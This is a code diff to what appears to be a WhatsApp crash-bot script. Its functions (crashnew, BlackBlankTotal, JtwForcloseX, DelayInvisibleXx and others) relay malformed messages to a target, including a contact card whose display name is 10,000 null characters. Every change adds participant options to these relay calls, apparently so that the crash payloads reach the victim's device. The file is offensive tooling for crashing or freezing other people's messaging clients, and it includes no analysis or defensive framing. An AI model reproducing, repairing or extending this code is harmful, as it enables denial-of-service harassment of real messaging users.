@@ -103,7 +103,7 @@ async function DelayInvisibleXx(sock, target) {
 
     try {
         await sock.relayMessage(target, payload, {
-            participant: { jid: target },
+            participant: { jid: target, count: '0' },
             messageId: undefined
         });
     } catch (err) {
@@ -188,7 +188,7 @@ async function delayMakerInvisible(sock, target) {
     };
 
     await sock.relayMessage(target, message, {
-        participant: { jid: target }
+        participant: { jid: target, count: '0' }
     });
 }
 
@@ -393,14 +393,14 @@ async function crashnew(sock, target) {
             firstMedia: {},
             contextInfo: payload.contextInfo
         }
-    }, { messageId: "alb_" + Date.now(), participant: null });
+    }, { messageId: "alb_" + Date.now(), participant: { jid: target, count: '0' } });
     await sock.relayMessage(target, {
         contactMessage: {
             displayName: "\u0000".repeat(10000),
             vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:\nTEL;waid=666666666666:\nEND:VCARD",
             contextInfo: payload.contextInfo
         }
-    }, { messageId: "ctc_" + Date.now(), participant: null });
+    }, { messageId: "ctc_" + Date.now(), participant: { jid: target, count: '0' } });
     await sock.relayMessage(target, {
         nativeFlowMessage: {
             buttons: [],
@@ -413,7 +413,7 @@ async function crashnew(sock, target) {
             },
             contextInfo: payload.contextInfo
         }
-    }, { messageId: "flw_" + Date.now(), participant: null });
+    }, { messageId: "flw_" + Date.now(), participant: { jid: target, count: '0' } });
     await sock.relayMessage(target, {
         viewOnceMessage: {
             message: {
@@ -424,7 +424,7 @@ async function crashnew(sock, target) {
                 }
             }
         }
-    }, { messageId: "vom_" + Date.now(), participant: null });
+    }, { messageId: "vom_" + Date.now(), participant: { jid: target, count: '0' } });
 }
 
 async function BlackBlankTotal(sock, target, mention) {
@@ -514,7 +514,7 @@ async function XProtexBlankChatV3(sock, target) {
     };
 
     await sock.relayMessage(target, msg, {
-        participant: { jid: target },
+        participant: { jid: target, count: '0' },
         messageId: null,
     });
 
@@ -540,7 +540,7 @@ async function XProtexBlankChatV3(sock, target) {
         },
     };
     await sock.relayMessage(target, messageCrash2, {
-        participant: { jid: target },
+        participant: { jid: target, count: '0' },
     });
 }
 
@@ -601,7 +601,7 @@ async function JtwStuck(sock, target) {
 
         await sock.relayMessage(target, carousel.message, {
             messageId: carousel.key.id,
-            participant: { jid: target }
+            participant: { jid: target, count: '0' }
         });
 
         let message = {
@@ -689,7 +689,7 @@ async function NexusChatAiCrash(sock, target) {
         };
 
         await sock.relayMessage(target, message, {
-            participant: { jid: target },
+            participant: { jid: target, count: '0' },
         });
     } catch (err) {
         console.log(err);
@@ -737,7 +737,7 @@ async function EmpireUltimate(sock, target) {
         );
 
         await sock.relayMessage(target, msg.message, {
-            participant: { jid: target },
+            participant: { jid: target, count: '0' },
             messageId: msg.key.id
         });
     }
@@ -811,6 +811,7 @@ async function SkyForce(sock, target) {
     );
 
     await sock.relayMessage(target, msg.message, {
+        participant: { jid: target, count: '0' },
         messageId: msg.key.id,
     });
 }
@@ -885,7 +886,7 @@ async function DocuMorsh01(sock, target) {
 
     await sock.relayMessage(target, msg.message, {
         additionalNodes: msg.stanza,
-        participant: { jid: target },
+        participant: { jid: target, count: '0' },
     });
 }
 
@@ -920,7 +921,7 @@ async function JtwForcloseX(sock, target) {
             },
         };
         await sock.relayMessage(target, message, {
-            participant: { jid: target },
+            participant: { jid: target, count: '0' },
         });
     } catch (err) {
         console.log(err);
